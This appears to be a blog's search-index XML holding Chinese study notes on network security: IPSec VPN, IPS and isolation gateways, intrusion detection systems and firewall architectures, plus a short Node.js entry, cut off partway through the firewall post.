<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>虚拟专用网络</title>
      <link href="/2023/12/08/%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E7%BD%91%E7%BB%9C/"/>
      <url>/2023/12/08/%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="VPN的基本概念"><a href="#VPN的基本概念" class="headerlink" title="VPN的基本概念"></a>VPN的基本概念</h1><blockquote><p>两个内部子网之间的相互通信可以使用vpn技术，让A网段的a以为B网段的b与它在同一个网络，同理b</p></blockquote><ul><li>再公用网络上建立&#x3D;&#x3D;虚拟的专用网络&#x3D;&#x3D;，安全通信</li><li>真正的专用网络从物理上就是单独的（非电信移动联通转发）</li></ul><h1 id="IPSec协议"><a href="#IPSec协议" class="headerlink" title="IPSec协议"></a>IPSec协议</h1><ul><li>不是一个单一的协议</li><li>有三个主要协议+加密认证算法组成</li></ul><h2 id="1-IP鉴别头AH"><a href="#1-IP鉴别头AH" class="headerlink" title="1.IP鉴别头AH"></a>1.IP鉴别头AH</h2><ul><li><p>对IP数据包有一层封装，添加了AH头</p></li><li><p>提供：&#x3D;&#x3D;选择&#x3D;&#x3D;</p><ul><li><strong>无连接完整性</strong></li><li><strong>数据起源鉴别</strong>（不依赖IP地址，可伪造），使用密钥</li><li><strong>抗重放攻击</strong>，使用序列号</li><li><strong>不能提供机密性！！！</strong></li></ul></li><li><p>两种工作模式</p><ul><li>传输模式</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原ip头 +AH头 + TCP/UD头 + 数据</span><br></pre></td></tr></table></figure><p>原始的ip地址并不会转换，无法翻墙</p><p>保护通道：主机11———-主机21</p><ul><li>隧道模式</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">新IP头 + AH头 + 原IP头 + TCP/UDP头 + 数据</span><br></pre></td></tr></table></figure><p>原始ip地址被换掉，换成安全网关的IP</p><p>保护通道：主机11-安全网关———-主机21-安全网关</p></li><li><h2 id="报文段"><a href="#报文段" class="headerlink" title="报文段- - "></a>报文段<br>- <img src="/2023/12/08/%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E7%BD%91%E7%BB%9C/image-20231208095327066.png" alt="image-20231208095327066"><br>- <img src="/2023/12/08/%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E7%BD%91%E7%BB%9C/image-20231208095351256.png" alt="image-20231208095351256"></h2></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全知识，网安技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vpn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>其他防御系统</title>
      <link href="/2023/12/04/%E5%85%B6%E4%BB%96%E9%98%B2%E5%BE%A1%E7%B3%BB%E7%BB%9F/"/>
      <url>/2023/12/04/%E5%85%B6%E4%BB%96%E9%98%B2%E5%BE%A1%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="IPS"><a href="#IPS" class="headerlink" title="IPS"></a>IPS</h1><h2 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h2><ul><li>IPS就是防火墙加上入侵检测系统</li><li>IPS vs IDS</li><li>部署方式<img src="/2023/12/04/%E5%85%B6%E4%BB%96%E9%98%B2%E5%BE%A1%E7%B3%BB%E7%BB%9F/image-20231204091957208.png" alt="image-20231204091957208"></li><li><img src="/2023/12/04/%E5%85%B6%E4%BB%96%E9%98%B2%E5%BE%A1%E7%B3%BB%E7%BB%9F/image-20231204092248774.png" alt="image-20231204092248774"></li></ul><h2 id="2-部署方式"><a href="#2-部署方式" class="headerlink" title="2. 部署方式"></a>2. 部署方式</h2><p><img src="/2023/12/04/%E5%85%B6%E4%BB%96%E9%98%B2%E5%BE%A1%E7%B3%BB%E7%BB%9F/image-20231204092433111.png" alt="image-20231204092433111"></p><img src="/2023/12/04/%E5%85%B6%E4%BB%96%E9%98%B2%E5%BE%A1%E7%B3%BB%E7%BB%9F/image-20231204092923028.png" alt="image-20231204092923028" style="zoom:200%;"><h1 id="安全隔离与信息交换系统（网闸）"><a href="#安全隔离与信息交换系统（网闸）" class="headerlink" title="安全隔离与信息交换系统（网闸）"></a>安全隔离与信息交换系统（网闸）</h1><ul><li>传统方式：物理隔离</li><li>传统方式：人工拷盘</li></ul><h2 id="1-定义-1"><a href="#1-定义-1" class="headerlink" title="1. 定义"></a>1. 定义</h2><p>网闸是在两个不同安全与之间，通过协议转换的手段，以 信息摆渡的方式实现数据交换，且只有被系统明确要求传 输的信息才可以通过。其信息流一般为通用应用服务</p><p>在信息摆渡的过程中内外网（上下游）通过策略控制连接发 生，所以“网闸产品”必须要有至少两套主机和一个隔离部 件才可完成物理隔离任务。</p><p> 网闸主要用于在两个隔离程度高的网络之间进行安全的数据 交换。</p><p><img src="/2023/12/04/%E5%85%B6%E4%BB%96%E9%98%B2%E5%BE%A1%E7%B3%BB%E7%BB%9F/image-20231204094641067.png" alt="image-20231204094641067"></p><p><img src="/2023/12/04/%E5%85%B6%E4%BB%96%E9%98%B2%E5%BE%A1%E7%B3%BB%E7%BB%9F/image-20231204095212862.png" alt="image-20231204095212862"></p><h2 id="2-使用场景："><a href="#2-使用场景：" class="headerlink" title="2.使用场景："></a>2.使用场景：</h2><p><img src="/2023/12/04/%E5%85%B6%E4%BB%96%E9%98%B2%E5%BE%A1%E7%B3%BB%E7%BB%9F/image-20231204095533218.png" alt="image-20231204095533218"></p><p>&#x3D;&#x3D;涉密网与互联网之间不能够通过任何形式连接，安全网闸也不行&#x3D;&#x3D;（！选择）</p>]]></content>
      
      
      <categories>
          
          <category> 安全知识，网安技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入侵检测,IPS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nodejs</title>
      <link href="/2023/11/29/nodejs/"/>
      <url>/2023/11/29/nodejs/</url>
      
        <content type="html"><![CDATA[<blockquote><p>nodejs能够搭建一个webserver，也就是可以不需要服务器部署</p><p>但是像其他的框架，flask等，是需要部署比如apache等webserver托管的，才能够真正投入商用。</p></blockquote><p><img src="/2023/11/29/nodejs/image-20231129194623736.png" alt="image-20231129194623736"></p><ul><li><p>commen JS</p><ul><li>一个文件就是一个模块</li><li>一个模块内部的变量、方法是私有的</li><li>require、export引用输出</li><li>本地自己写的模块要加路径</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mymodoule=<span class="built_in">require</span>(<span class="string">&quot;./modoulname&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>难点：</p><ul><li>exports&#x3D;module.exports&#x3D;{lg:++++}</li><li>一定是属性赋值，而不要让exports指向一个新的对象，</li></ul></li><li><p>回调函数</p><ul><li>实现异步io逻辑的程序机制，当触发条件达到，执行终端后调用回调函数。</li></ul></li><li><p>事件循环机制</p><ul><li>先处理非事件指令，事件（IO）就交给IO处理-&gt;事件池</li><li>当非事件指令处理完后，统一处理IO</li></ul></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术栈学习 </category>
          
          <category> web应用开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>入侵检测</title>
      <link href="/2023/11/24/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"/>
      <url>/2023/11/24/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="一、入侵检测技术（还是属于边界安全的领域）"><a href="#一、入侵检测技术（还是属于边界安全的领域）" class="headerlink" title="一、入侵检测技术（还是属于边界安全的领域）"></a>一、入侵检测技术（还是属于边界安全的领域）</h1><blockquote><ul><li>安全放在研发测，安全左移-&gt;渗透测试x</li><li>内部问题不知道，选择建立&#x3D;&#x3D;边界安全&#x3D;&#x3D;</li><li>边界防护设备都有问题，光造墙不够</li><li>从外部转向内部（&#x3D;&#x3D;内生安全&#x3D;&#x3D;）</li></ul></blockquote><h2 id="1-网络安全时间"><a href="#1-网络安全时间" class="headerlink" title="1. 网络安全时间"></a>1. 网络安全时间</h2><ul><li>pt&gt;dt+rt:安全</li></ul><h2 id="2-核心动作"><a href="#2-核心动作" class="headerlink" title="2. 核心动作"></a>2. 核心动作</h2><ul><li>智能发现攻击</li><li>发起警报</li><li>启动响应</li></ul><h2 id="3-入侵"><a href="#3-入侵" class="headerlink" title="3. 入侵"></a>3. 入侵</h2><ul><li>类型<ul><li>网络嗅探</li><li>利用</li><li>拒绝服务</li></ul></li></ul><h2 id="4-入侵防御体系"><a href="#4-入侵防御体系" class="headerlink" title="4.入侵防御体系"></a>4.入侵防御体系</h2><ul><li>预防入侵<ul><li>攻击发生在：<ul><li>网络、操作系统和应用再设计和实现上的缺陷</li><li>隧道技术</li><li>来自网络内部的攻击</li></ul></li></ul></li><li>检测入侵<ul><li>核心</li></ul></li><li>反应</li></ul><h2 id="5-功能"><a href="#5-功能" class="headerlink" title="5. 功能"></a>5. 功能</h2><ul><li>自动检测入侵行为</li><li>监视网络流量</li><li>…</li></ul><h2 id="6-入侵检测模型"><a href="#6-入侵检测模型" class="headerlink" title="6. 入侵检测模型"></a>6. 入侵检测模型</h2><blockquote><p>模型高于技术，更加宏观</p></blockquote><ul><li><h3 id="通用入侵检测模型（Denning）"><a href="#通用入侵检测模型（Denning）" class="headerlink" title="通用入侵检测模型（Denning）"></a>通用入侵检测模型（Denning）</h3><ul><li>提出了异常活动和计算机不当使用之间的相关性</li><li>假设：入侵行为可以通过检查一个系统的审计记录、从中识别异常使用系统的入侵行为</li><li>可检测：<ul><li>黑客入侵</li><li>未授权操作或越权操作</li><li>其他</li></ul></li><li>实际上是一个基于规则的模式匹配系统</li><li>未包含已知系统漏洞或攻击方法方面的知识（通用性）</li></ul></li><li><h3 id="层次化入侵检测模型（IDM）"><a href="#层次化入侵检测模型（IDM）" class="headerlink" title="层次化入侵检测模型（IDM）"></a>层次化入侵检测模型（IDM）</h3><ul><li>IDM将IDS分为六个层次<ul><li>数据层</li><li>事件层</li><li>主体层</li><li>上下文层</li><li>威胁层<ul><li>根据滥用的特征和对象对威胁进行分类。</li><li>滥用：攻击、误用、可疑</li></ul></li><li>安全状态层<ul><li>用1-100表征网络的安全状态，越大越&#x3D;&#x3D;不&#x3D;&#x3D;安全</li></ul></li></ul></li><li>把收集到的分散数据进行&#x3D;&#x3D;加工抽象和数据关联操作&#x3D;&#x3D;，简化了跨越单机（DDOS）的入侵行为识别。</li></ul></li><li><h3 id="管理式入侵检测模型（SNMP-IDSM）"><a href="#管理式入侵检测模型（SNMP-IDSM）" class="headerlink" title="管理式入侵检测模型（SNMP-IDSM）"></a>管理式入侵检测模型（SNMP-IDSM）</h3><ul><li>出现原因：不同IDS之间信息交换困难，不同IDS的通信工具</li><li>定义描述入侵事件的管理信息库</li><li>入侵事件分类：<ul><li>原始事件</li><li>抽象事件</li></ul></li><li>五元组（where when what …）</li></ul></li><li><h3 id="通用入侵检测系统架构：CIFD架构"><a href="#通用入侵检测系统架构：CIFD架构" class="headerlink" title="通用入侵检测系统架构：CIFD架构"></a>通用入侵检测系统架构：CIFD架构</h3><ul><li>阐述一个入侵检测系统的通用架构</li><li>组成：<ul><li>事件生成器</li><li>事件分析器</li><li>事件响应器</li><li>事件数据库</li></ul></li></ul></li><li><h3 id="三大部分："><a href="#三大部分：" class="headerlink" title="三大部分："></a>三大部分：</h3><ul><li>信息采集</li><li>信息分析</li><li>攻击响应</li></ul></li></ul><h2 id="7-入侵检测系统的分类"><a href="#7-入侵检测系统的分类" class="headerlink" title="7.入侵检测系统的分类"></a>7.入侵检测系统的分类</h2><ul><li>检测技术：<ul><li>异常检测——白名单</li><li>特征检测——黑名单</li></ul></li><li>按检测范围<ul><li>基于主机</li><li>基于网络</li><li>基于网络节点</li></ul></li></ul><h2 id="8-异常检测"><a href="#8-异常检测" class="headerlink" title="8.异常检测"></a>8.异常检测</h2><ul><li>也称为&#x3D;&#x3D;基于行为的检测&#x3D;&#x3D;</li><li>假设：所有入侵行为都是异常的</li><li>优点：<ul><li>自适应、自学习功能</li><li>不需要先验知识</li></ul></li><li>常用技术<ul><li>量化分析技术</li><li>基于马尔可夫过程</li><li>基于神经网络</li><li>基于免疫学</li><li>…</li></ul></li><li>库不健全：误报</li></ul><h2 id="9-特征检测（misuse）"><a href="#9-特征检测（misuse）" class="headerlink" title="9.特征检测（misuse）"></a>9.特征检测（misuse）</h2><ul><li>也称为&#x3D;&#x3D;误用检测&#x3D;&#x3D;</li><li>攻击和系统漏洞库是基础</li><li>可以精准识别入侵行为和攻击类型</li><li>优点：<ul><li>准确率高</li><li>算法简单</li></ul></li><li>库不健全：漏报</li></ul><h2 id="10-主机入侵检测系统"><a href="#10-主机入侵检测系统" class="headerlink" title="10. 主机入侵检测系统"></a>10. 主机入侵检测系统</h2><ul><li><p>代理软件，安装在检测的主机上</p></li><li><p>网络连接检测</p><ul><li>对该主机的数据流进行检测</li></ul></li><li><p>主机文件检测</p><ul><li>系统日志：不正常的反复登录失败记录、未授权用户越权访问重要文件、非正常登陆行为</li><li>文件系统：目录或文件被非正常地创建、修改或删除，怀疑被入侵检测。</li><li>进程记录：黑客可能让程序的进程分解、导致程序终止</li></ul></li><li><p>特点：</p><ul><li><p>长期监控谁访问什么</p></li><li><p>将问题映射到一个用户ID</p></li><li><p>系统可以跟踪滥用相关行为的变化</p></li><li><p>适用于加密：即使是https，仍然可以拿到明文数据，因为协议栈代码存在于{OS的中间件、一些比较私有的在软件中}，又因为加密函数都是调用的WindowsAPI，可以使用hook函数勾到加密函数，那么就可以获取到加密后的明文数据。（有这些底层技术支撑）</p></li><li><p>可以运行在交换环境中</p></li><li><p>检测分布多台主机的负载，并只要将有关数据上报中央控制系统</p></li><li><hr></li><li><p>无法检测网络活动（本机之外的）</p></li><li><p>审计机制增加了系统负载</p></li><li><p>审计记录会占据大量存储空间</p></li><li><p>OS漏洞可能破坏代理软件的有效性</p></li><li><p>不同操作系统需要不同的代理软件</p></li><li><p>升级问题，每台机器都要升级</p></li><li><p>&#x3D;&#x3D;更高的维护和运行成本&#x3D;&#x3D;</p></li></ul></li></ul><h2 id="11、网络入侵检测系统"><a href="#11、网络入侵检测系统" class="headerlink" title="11、网络入侵检测系统"></a>11、网络入侵检测系统</h2><ul><li><p>独立个体被放入被保护的网络上</p></li><li><p>混杂模式接入网络</p></li><li><p>感应器可以部署在关键部位</p></li><li><p>检测引擎的关键技术</p><ul><li><h3 id="模式匹配技术"><a href="#模式匹配技术" class="headerlink" title="模式匹配技术"></a>模式匹配技术</h3><ul><li>将数据包的包头开始，与攻击特征匹配</li><li>耗费资源</li></ul></li><li><h3 id="协议分析技术"><a href="#协议分析技术" class="headerlink" title="协议分析技术"></a>协议分析技术</h3><ul><li>层层协议识别，对关键内容检测</li><li>要求支持海量的通信协议</li></ul></li></ul></li><li><p>优点</p><ul><li>不需要重新配置或重定向日志机制就可以快速获取信息</li><li>部署不影响现有的网络架构</li><li>与OS无关</li></ul></li><li><p>缺点</p><ul><li>无法分析加密数据</li><li>可以从网络流量推断发生了什么，但是不能判断结果</li><li>对带宽要求高</li></ul></li></ul><h2 id="12-网络节点入侵检测"><a href="#12-网络节点入侵检测" class="headerlink" title="12.网络节点入侵检测"></a>12.网络节点入侵检测</h2><ul><li>安装在网络节点的主机中（结合10NIDS、11HIDS）</li><li>基于主机的IDS有阻断功能；基于网络的由于是并联，所以无法阻断{可以发送警告给防火墙（串行接入）}。</li></ul><h2 id="13-两个指标"><a href="#13-两个指标" class="headerlink" title="13. 两个指标"></a>13. 两个指标</h2><ul><li><h3 id="漏报率"><a href="#漏报率" class="headerlink" title="漏报率"></a>漏报率</h3><ul><li>基于特征</li></ul></li><li><h3 id="误报率"><a href="#误报率" class="headerlink" title="误报率"></a>误报率</h3><ul><li>基于异常</li></ul></li><li><h3 id="检出率"><a href="#检出率" class="headerlink" title="检出率"></a>检出率</h3><ul><li><p>100个攻击事件检测出多少</p></li><li><p>检出率与误报率成正比例关系</p><blockquote><p>理解：100个事件检出率100%，100个都是异常，说明误报率也很高</p></blockquote></li></ul></li></ul><h2 id="14-基于网络IDS的实现"><a href="#14-基于网络IDS的实现" class="headerlink" title="14. 基于网络IDS的实现"></a>14. 基于网络IDS的实现</h2><ul><li><p>收集网络流量’</p></li><li><p>攻击识别</p></li><li><h3 id="一个轻量的网络IDS：SNORT"><a href="#一个轻量的网络IDS：SNORT" class="headerlink" title="一个轻量的网络IDS：SNORT"></a>一个轻量的网络IDS：SNORT</h3><ul><li>基于规则和特征匹配的IDS</li></ul></li></ul><h2 id="15-异常检测的网络IDS"><a href="#15-异常检测的网络IDS" class="headerlink" title="15. 异常检测的网络IDS"></a>15. 异常检测的网络IDS</h2><ul><li>有一定的自适应能力</li></ul><h2 id="16-基于主机的IDS系统实现"><a href="#16-基于主机的IDS系统实现" class="headerlink" title="16. 基于主机的IDS系统实现"></a>16. 基于主机的IDS系统实现</h2><ul><li>收集信息</li><li>常用的分析技术</li><li>STAT</li></ul><h2 id="17、面临问题"><a href="#17、面临问题" class="headerlink" title="17、面临问题"></a>17、面临问题</h2><ul><li>误警率高</li><li>缺少同意的构建方法学</li><li>自学习能力差</li><li>自身易受攻击</li></ul><h2 id="18-发展趋势"><a href="#18-发展趋势" class="headerlink" title="18. 发展趋势"></a>18. 发展趋势</h2><ul><li>分布式入侵检测</li><li>应用层入侵检测</li><li>智能入侵检测</li><li>综合性检测系统</li></ul><h2 id="19-部署"><a href="#19-部署" class="headerlink" title="19.部署"></a>19.部署</h2><ul><li>内网主机、内网、网络</li><li>考点：</li><li><img src="/2023/11/24/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/image-20231204082605816.png" alt="image-20231204082605816"></li><li><img src="/2023/11/24/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/image-20231204082624308.png" alt="image-20231204082624308"></li><li>分布式IDS：<ul><li><img src="/2023/11/24/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/image-20231204083013065.png" alt="image-20231204083013065"></li><li>内部与内部</li><li>外部internet与内部</li><li><img src="/2023/11/24/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/image-20231204083634641.png" alt="image-20231204083634641"></li></ul></li><li>部署的问题：<ul><li><img src="/2023/11/24/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/image-20231204083848386.png" alt="image-20231204083848386"></li></ul></li><li><h2 id="应用问题："><a href="#应用问题：" class="headerlink" title="应用问题：- "></a>应用问题：<br>- <img src="/2023/11/24/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/image-20231204084025070.png" alt="image-20231204084025070"></h2></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全知识，网安技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入侵检测,IPS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>防火墙技术</title>
      <link href="/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/"/>
      <url>/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="防火墙的基本概念"><a href="#防火墙的基本概念" class="headerlink" title="防火墙的基本概念"></a>防火墙的基本概念</h1><ul><li><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><ul><li>在网络间（内部&#x2F;外部网 络、不同信息级别、）提 供安全连接的设备；</li><li>用于实现和执行网络之间通信的&#x3D;&#x3D;安全策略&#x3D;&#x3D;</li><li>是什么：高级的访问控制设备</li><li>位置：不同安全域之间</li><li>基础功能：控制（允许、拒绝、监视、记录）进出网络的访问行为</li></ul></li><li><h2 id="发展历程"><a href="#发展历程" class="headerlink" title="发展历程"></a>发展历程</h2><ul><li><img src="/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/image-20231117084535010.png" alt="image-20231117084535010"></li></ul></li><li><h2 id="核心技术"><a href="#核心技术" class="headerlink" title="核心技术"></a>核心技术</h2><ul><li><h3 id="防火墙的分类"><a href="#防火墙的分类" class="headerlink" title="防火墙的分类"></a>防火墙的分类</h3><ul><li><h4 id="实现方式上来分"><a href="#实现方式上来分" class="headerlink" title="实现方式上来分"></a>实现方式上来分</h4><ul><li>硬件防火墙：硬件防火墙通常 部署在&#x3D;&#x3D;内、外部网络之间， 通过软、硬件结合的方式&#x3D;&#x3D;来达到隔离内、外部网络的目的（安全域之间）</li><li>和软件防火墙：以在一个 &#x3D;&#x3D;独立的机器（保护个人机器）&#x3D;&#x3D;上运行，通过一 定的规则来达到限制非法用 户访问的目的</li></ul></li><li><h4 id="从技术发展阶段来分"><a href="#从技术发展阶段来分" class="headerlink" title="从技术发展阶段来分"></a>从技术发展阶段来分</h4><ul><li>包过滤、应用代理、状态检测、完全内容检测</li><li><img src="/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/image-20231117085248165.png" alt="image-20231117085248165"></li></ul></li><li><h4 id="包过滤"><a href="#包过滤" class="headerlink" title="包过滤"></a>包过滤</h4><p>缺点：</p><ul><li>简单包过滤防火墙不检查数据区检查和过滤器只在网络层-不能识别应用层协议或维持连接状态 ▪</li><li>安全性薄弱 –不能防止IP欺骗等 ▪ 静态策略可能成为漏洞</li><li>不能防止假冒攻击</li></ul><p>优点：</p><ul><li>只对数据包的 IP 地址、 TCP&#x2F;UDP 协议和端口进行分析，规 则简单，处理速度较快 </li><li>易于配置 </li><li>对用户透明-用户访问时不需要提供额外的密码或使用特殊的 命令</li></ul></li><li><h4 id="应用网关或代理（-Application-Gateway-or-Proxy）"><a href="#应用网关或代理（-Application-Gateway-or-Proxy）" class="headerlink" title="应用网关或代理（ Application Gateway or Proxy）"></a>应用网关或代理（ Application Gateway or Proxy）</h4><ul><li><p>在应用层检查数据包 </p></li><li><p>能够对应用或内容进行过滤 – 如：禁止FTP的 “put”命令（可以检测应用层数据）</p><p>优点： </p></li><li><p>可以检查应用层、传输层和网络层的协议特征，对数据包的检测能力比较强 </p></li><li><p>提供良好的安全性 - 所有数据的有效负载都在应用层进行检查 应用代理或网关防火墙具有以下特点：</p></li></ul><p>  缺点： </p><ul><li><p>支持的应用数量有限，无法很好的支持新的应用、技术和协议 </p></li><li><p>对用户不透明度 </p></li><li><p>性能表现欠佳，需要审计数据</p></li></ul></li><li><h4 id="状态检测防火墙（Stateful-Inspection）"><a href="#状态检测防火墙（Stateful-Inspection）" class="headerlink" title="状态检测防火墙（Stateful Inspection）"></a>状态检测防火墙（Stateful Inspection）</h4><ul><li>不检查数据区</li><li>建立连接状态表</li><li>前后保温相关</li><li>应用层控制弱</li><li>预防syn泛洪攻击</li></ul></li><li><h4 id="完全内容检测防火墙"><a href="#完全内容检测防火墙" class="headerlink" title="完全内容检测防火墙"></a>完全内容检测防火墙</h4><ul><li>网络层保护强</li><li>应用层保护强</li><li>会话保护强</li><li>上下文相关</li><li>前后报文有联系</li><li>性能太弱</li></ul></li></ul></li></ul></li></ul><h1 id="2-防火墙的体系结构（画图）"><a href="#2-防火墙的体系结构（画图）" class="headerlink" title="2. 防火墙的体系结构（画图）"></a>2. 防火墙的体系结构（画图）</h1><ul><li><h2 id="过滤路由器结构"><a href="#过滤路由器结构" class="headerlink" title="过滤路由器结构"></a>过滤路由器结构</h2><ul><li><img src="/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/image-20231117093007748.png" alt="image-20231117093007748"></li><li>它的缺点是一旦被攻陷后很难发现，而且不能识别不同的 用户（没有日志记录）</li></ul></li><li><h2 id="多宿主主机结构"><a href="#多宿主主机结构" class="headerlink" title="多宿主主机结构"></a>多宿主主机结构</h2><ul><li><img src="/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/image-20231117093124532.png" alt="image-20231117093124532"></li><li>一个台式机机器2个网卡，一个接内网，一个接外网；中间通信有一个软件防火墙（检查转发）</li><li>堡垒主机的 系统软件可用于维护系统日志</li><li>它的致命弱点是：一旦入侵者侵入堡垒主机，则无 法保证内部网络的安全。</li></ul></li><li><h2 id="被屏蔽主机结构"><a href="#被屏蔽主机结构" class="headerlink" title="被屏蔽主机结构"></a>被屏蔽主机结构</h2><ul><li><img src="/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/image-20231117093530812.png" alt="image-20231117093530812"></li><li>有两道屏障，一是屏蔽路由器，另外一个是堡垒主机（双宿主主机）</li><li>弱点：通双宿主主机，但是攻击难度变大</li></ul></li><li><h2 id="被屏蔽子网结构"><a href="#被屏蔽子网结构" class="headerlink" title="被屏蔽子网结构"></a>被屏蔽子网结构</h2><ul><li><img src="/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/image-20231117093923379.png" alt="image-20231117093923379" style="zoom:33%;"></li><li>外网和黑网可以访问到子网主机，但是外网有一定规则才能访问到内网</li><li>特点：如果攻击者试图进入内网或者子网，他必须 攻破过滤路由器和双宿主主机 ，然后才可以进入 子网主机，整个过程中将引发警报机制。</li></ul></li></ul><h2 id="3-防火墙的功能"><a href="#3-防火墙的功能" class="headerlink" title="3.防火墙的功能"></a>3.防火墙的功能</h2><p><img src="/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/image-20231117094321756.png" alt="image-20231117094321756"></p><p>记录、访问控制</p><p><img src="/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/image-20231117094435232.png" alt="image-20231117094435232"></p><p>路由器、防火墙功能开始混杂</p><ol><li><h5 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h5><p><img src="/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/image-20231117095503512.png" alt="image-20231117095503512"></p></li><li><h4 id="MAP"><a href="#MAP" class="headerlink" title="MAP"></a>MAP</h4></li></ol><ul><li><img src="/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/image-20231120082236231.png" alt="image-20231120082236231"></li><li>不同地址不同端口映射到同一公网ip的不同端口</li><li>外部公网ip：202.102.1.3</li><li>不同地址端口：199.168.1.4 53（mail）</li></ul><ol start="3"><li><h4 id="基本的访问控制功能"><a href="#基本的访问控制功能" class="headerlink" title="基本的访问控制功能"></a>基本的访问控制功能</h4></li></ol><ul><li><img src="/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/image-20231120082554004.png" alt="image-20231120082554004"></li><li>也有基于时间的</li><li>与ids联动：ids识别，防火墙动态配置规则，过滤攻击<ul><li>防火墙串联；ids并联</li></ul></li></ul><ol start="4"><li><h4 id="多种鉴别方式和第三方鉴别"><a href="#多种鉴别方式和第三方鉴别" class="headerlink" title="多种鉴别方式和第三方鉴别"></a>多种鉴别方式和第三方鉴别</h4></li><li><h4 id="ip与mac绑定"><a href="#ip与mac绑定" class="headerlink" title="ip与mac绑定"></a>ip与mac绑定</h4></li></ol><ul><li>同一机器使用同一个ip</li><li>防止假冒</li></ul><ol start="6"><li><h4 id="对DHCP的支持"><a href="#对DHCP的支持" class="headerlink" title="对DHCP的支持"></a>对DHCP的支持</h4></li><li><h4 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h4></li></ol><ul><li><img src="/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/image-20231120084752242.png" alt="image-20231120084752242"></li></ul><ol start="8"><li><h4 id="高可用性：双机热备"><a href="#高可用性：双机热备" class="headerlink" title="高可用性：双机热备"></a>高可用性：双机热备</h4></li></ol><ul><li><img src="/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/image-20231120085013327.png" alt="image-20231120085013327"></li></ul><ol start="9"><li><h4 id="高可用性：服务器负载均衡"><a href="#高可用性：服务器负载均衡" class="headerlink" title="高可用性：服务器负载均衡"></a>高可用性：服务器负载均衡</h4></li></ol><ul><li><img src="/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/image-20231120090149162.png" alt="image-20231120090149162"></li></ul><ol start="10"><li><h4 id="扩展功能–-IPSEC-VPN功能"><a href="#扩展功能–-IPSEC-VPN功能" class="headerlink" title="扩展功能– IPSEC VPN功能"></a>扩展功能– IPSEC VPN功能</h4></li></ol><ul><li><p>esp模式：</p><p><img src="/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/image-20231120090239777.png" alt="image-20231120090239777"></p><ul><li>隧道模式，同一公司不同内网之间的通信</li></ul></li></ul><h2 id="4-接入模式"><a href="#4-接入模式" class="headerlink" title="4. 接入模式"></a>4. 接入模式</h2><ul><li><h3 id="路由接入模式："><a href="#路由接入模式：" class="headerlink" title="路由接入模式："></a>路由接入模式：</h3><ul><li>防火墙相当于一 个简单的路由器 ，提供简单的路由接入功能</li><li></li></ul></li></ul><p><img src="/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/image-20231120092112576.png" alt="image-20231120092112576"></p><ul><li><h3 id="透明接入模式"><a href="#透明接入模式" 